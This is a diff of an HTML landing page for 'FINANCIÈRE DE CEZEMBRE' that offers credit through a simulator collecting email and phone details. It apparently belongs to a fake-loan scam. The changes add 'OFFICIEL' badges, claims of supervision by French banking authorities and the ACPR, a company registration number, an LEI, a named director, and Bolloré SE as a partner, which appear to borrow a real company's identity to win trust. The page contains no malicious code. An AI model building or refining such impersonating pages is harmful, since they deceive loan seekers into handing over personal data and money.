@@ -19,31 +19,26 @@
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Montserrat', sans-serif; }
         body { background-color: var(--white); color: #333; overflow-x: hidden; }
 
-        /* HEADER */
         header {
             background: var(--white); padding: 20px 8%; display: flex;
             justify-content: space-between; align-items: center;
             position: fixed; width: 100%; z-index: 1000; box-shadow: 0 4px 12px rgba(0,0,0,0.05);
         }
         .logo { font-weight: 700; font-size: 1.4rem; color: var(--navy); letter-spacing: -1px; }
-        
-        /* BOUTON PAYS/LANGUE AVEC DRAPEAU FRANÇAIS PAR DÉFAUT */
+
         .lang-container { position: relative; }
         .lang-btn { 
-            background: #f0f0f0; border: 1px solid #ddd; padding: 8px 15px; 
-            border-radius: 25px; cursor: pointer; display: flex; align-items: center; gap: 10px;
-            font-weight: 700; font-size: 0.85rem; color: var(--navy);
+            background: #EEE; padding: 8px 15px; border-radius: 4px; font-size: 0.8rem; 
+            cursor: pointer; display: flex; align-items: center; gap: 8px; border: none; font-weight: 600;
         }
-        .lang-btn img { width: 22px; border-radius: 3px; box-shadow: 0 1px 3px rgba(0,0,0,0.2); }
+        .lang-btn img { width: 20px; border-radius: 2px; }
 
-        /* BADGE JAUNE LÉGAL (DORÉ) */
         .legal-badge {
-            display: inline-flex; align-items: center; background: #FFD700; color: #000;
-            padding: 5px 12px; border-radius: 4px; font-weight: 800; font-size: 0.7rem;
-            margin-right: 12px; text-transform: uppercase; letter-spacing: 0.5px;
+            display: inline-block; background: #FFD700; color: #000;
+            padding: 2px 8px; border-radius: 3px; font-weight: 700; font-size: 0.7rem;
+            margin-right: 10px; vertical-align: middle;
         }
 
-        /* HERO & SIMULATEUR */
         .hero {
             height: 100vh; background: linear-gradient(rgba(0,26,77,0.7), rgba(0,26,77,0.7)), 
             url('https://images.unsplash.com/photo-1497366216548-37526070297c?auto=format&fit=crop&q=80&w=2000');
@@ -51,6 +46,7 @@
             display: flex; align-items: center; padding: 0 8%; color: var(--white);
         }
         .hero-content { max-width: 600px; }
+        .welcome-msg { font-size: 0.85rem; text-transform: uppercase; letter-spacing: 2px; color: var(--gold); margin-bottom: 15px; font-weight: 600; }
         .hero-content h1 { font-size: 3.5rem; line-height: 1.2; margin-bottom: 20px; }
         
         .simulator { background: var(--white); padding: 40px; border-radius: 2px; width: 480px; box-shadow: 0 30px 60px rgba(0,0,0,0.4); color: var(--navy); }
@@ -63,20 +59,28 @@
         .btn-main:hover { background: var(--gold); }
 
         .form-input { width: 100%; padding: 12px; border: 1px solid #DDD; border-radius: 4px; margin-bottom: 10px; font-size: 0.9rem; }
-        
-        /* WHATSAPP */
+
+        .stats-bar { background: var(--navy); padding: 40px 8%; display: flex; justify-content: space-around; color: white; text-align: center; }
+        .stat-box h3 { font-size: 2rem; color: var(--gold); }
+
+        .about-section { padding: 100px 15%; line-height: 2; text-align: justify; background: var(--white); }
+        .about-section h2 { margin-bottom: 30px; color: var(--navy); text-align: center; }
+
+        footer { background: #0A0A0A; color: #888; padding: 80px 8% 40px; font-size: 0.8rem; }
+        .f-grid { display: grid; grid-template-columns: 2fr 1fr 1fr 1fr; gap: 50px; margin-bottom: 50px; }
+        .f-grid h4 { color: white; margin-bottom: 20px; font-size: 0.9rem; }
+        .legal-block { border-top: 1px solid #222; padding-top: 40px; line-height: 1.8; }
+        .tag-warning { border: 1px solid #444; padding: 15px; margin-top: 20px; color: #AAA; text-align: center; }
+
         .whatsapp-float {
-            position: fixed; bottom: 30px; left: 30px; background-color: var(--whatsapp); color: #FFF;
-            width: 60px; height: 60px; border-radius: 50px; text-align: center; font-size: 30px; 
-            box-shadow: 2px 2px 10px rgba(0,0,0,0.2); z-index: 1000; display: flex; align-items: center; justify-content: center;
+            position: fixed; bottom: 30px; left: 30px;
+            background-color: var(--whatsapp); color: #FFF;
+            width: 60px; height: 60px; border-radius: 50px;
+            text-align: center; font-size: 30px; box-shadow: 2px 2px 10px rgba(0,0,0,0.2);
+            z-index: 1000; display: flex; align-items: center; justify-content: center;
             text-decoration: none; transition: 0.3s;
         }
-        .whatsapp-float:hover { transform: scale(1.1); }
 
-        .about-section { padding: 100px 15%; line-height: 2; text-align: justify; }
-        footer { background: #0A0A0A; color: #888; padding: 60px 8%; font-size: 0.8rem; text-align: center; }
-        
-        /* Cacher la barre Google Translate */
         .goog-te-banner-frame.skiptranslate { display: none !important; }
         body { top: 0px !important; }
     </style>
@@ -88,11 +92,10 @@
 <header>
     <div class="logo">FINANCIÈRE DE CEZEMBRE</div>
     <div class="lang-container">
-        <div class="lang-btn" onclick="triggerGoogleTranslate()">
-            <img src="https://flagcdn.com/w40/fr.png" alt="France">
-            <span>CHOISIR MON PAYS</span>
-            <i class="fas fa-globe-europe"></i>
-        </div>
+        <button class="lang-btn" onclick="openTranslate()">
+            <img src="https://flagcdn.com/w40/fr.png">
+            <span>FRANCE / PAYS</span>
+        </button>
     </div>
 </header>
 
@@ -102,17 +105,21 @@
 
 <section class="hero">
     <div class="hero-content">
+        <div class="welcome-msg">Bienvenue sur notre portail européen sécurisé</div>
+        
         <h1>L'excellence financière <br>au service de vos projets.</h1>
         <p style="margin-bottom: 30px; opacity: 0.9;">Partenaire de confiance depuis 1990. Distribution de crédit institutionnel régulé.</p>
-        
-        <div style="display: flex; align-items: flex-start; gap: 5px;">
-            <div class="legal-badge"><i class="fas fa-shield-alt"></i> SOCIÉTÉ LÉGALE</div>
-            <p><strong>Société immatriculée au RCS 552 058 943</strong><br>
-            Sous la supervision des autorités bancaires françaises.</p>
+        <div style="display: flex; align-items: flex-start; gap: 10px;">
+            <i class="fas fa-shield-check" style="color: var(--gold); font-size: 2rem;"></i>
+            <p>
+                <span class="legal-badge">OFFICIEL</span>
+                <strong>Société immatriculée au RCS 552 058 943</strong><br>
+                Sous la supervision des autorités bancaires françaises.
+            </p>
         </div>
     </div>
 
-    <div class="simulator">
+    <div class="simulator" id="simBox">
         <div id="step1">
             <h3 style="margin-bottom: 30px;">Simulateur de Crédit</h3>
             <div class="sim-row">
@@ -140,6 +147,7 @@
                     <option value="Immobilier">Prêt Immobilier</option>
                     <option value="Auto">Auto / Moto</option>
                     <option value="Travaux">Travaux / Rénovation</option>
+                    <option value="Autre">Autre projet</option>
                 </select>
                 <input type="email" name="email" placeholder="Adresse e-mail" class="form-input" required>
                 <input type="tel" name="telephone" placeholder="Téléphone" class="form-input" required>
@@ -149,30 +157,38 @@
     </div>
 </section>
 
+<section class="stats-bar">
+    <div class="stat-box"><h3>1 200 000 €</h3><p>Capital Social</p></div>
+    <div class="stat-box"><h3>3.5%</h3><p>Taux Préférentiel</p></div>
+    <div class="stat-box"><h3>100%</h3><p>Digital & Sécurisé</p></div>
+</section>
+
 <section class="about-section" id="about">
-    <h2 style="text-align: center; margin-bottom: 40px; color: var(--navy);">Une Institution de Référence</h2>
+    <h2>Une Institution de Référence</h2>
     <p>FINANCIÈRE DE CEZEMBRE, dont le siège social est situé à Ergué-Gabéric (29500), est une société anonyme de référence dans le secteur de la distribution de crédit (Code APE 64.92Z). Fort d'un capital social de 1 200 000 euros, notre établissement assure une gestion rigoureuse des participations et des opérations financières complexes.</p>
     <p>Sous la direction de Monsieur Michel Pajot, Président du Conseil d’administration et Directeur général, nous collaborons avec des acteurs majeurs tels que Bolloré SE et Financière Arnil pour garantir une stabilité et une expertise inégalées sur le marché européen. Notre engagement repose sur la transparence, le respect scrupuleux de la convention collective des établissements financiers et une conformité totale aux directives de l'ACPR.</p>
 </section>
 
-<footer>
-    <p>&copy; 2026 FINANCIÈRE DE CEZEMBRE - RCS 552 058 943. UN CRÉDIT VOUS ENGAGE ET DOIT ÊTRE REMBOURSÉ.</p>
+<footer id="legal">
+    <div class="f-grid">
+        <div><h4>FINANCIÈRE DE CEZEMBRE</h4><p>Distribution de crédit institutionnel.<br>LEI : 969500WONJGTDZG8E035</p></div>
+        <div><h4>SIÈGE SOCIAL</h4><p>ODET, 29500<br>ERGUÉ-GABÉRIC, France</p></div>
+        <div><h4>GOUVERNANCE</h4><p>M. Michel Pajot<br>Bolloré SE, Financière Arnil.</p></div>
+        <div><h4>AUDIT</h4><p>Constantin Associés<br>BEAS (La Défense)</p></div>
+    </div>
+    <div class="legal-block">
+        <strong>INFORMATIONS LÉGALES :</strong> FINANCIÈRE DE CEZEMBRE SA. SIRET 552 058 943 00044. Soumis à l'ACPR. 
+        <div class="tag-warning">UN CRÉDIT VOUS ENGAGE ET DOIT ÊTRE REMBOURSÉ. VÉRIFIEZ VOS CAPACITÉS DE REMBOURSEMENT AVANT DE VOUS ENGAGER.</div>
+    </div>
 </footer>
 
 <script type="text/javascript">
-    // Initialisation Google Translate
     function googleTranslateElementInit() {
-        new google.translate.TranslateElement({
-            pageLanguage: 'fr',
-            layout: google.translate.TranslateElement.InlineLayout.SIMPLE,
-            autoDisplay: true // Active la détection auto du navigateur
-        }, 'google_translate_element');
+        new google.translate.TranslateElement({pageLanguage: 'fr', autoDisplay: true}, 'google_translate_element');
     }
-
-    // Fonction pour forcer l'ouverture du menu si besoin
-    function triggerGoogleTranslate() {
+    function openTranslate() {
         var el = document.querySelector('.goog-te-menu-value span');
-        if(el) { el.click(); } else { alert("Le service de traduction se charge..."); }
+        if(el) el.click();
     }
 </script>
 <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
@@ -193,6 +209,5 @@
     function goToStep2() { document.getElementById('step1').style.display = 'none'; document.getElementById('step2').style.display = 'block'; }
     calc();
 </script>
-
 </body>
 </html>
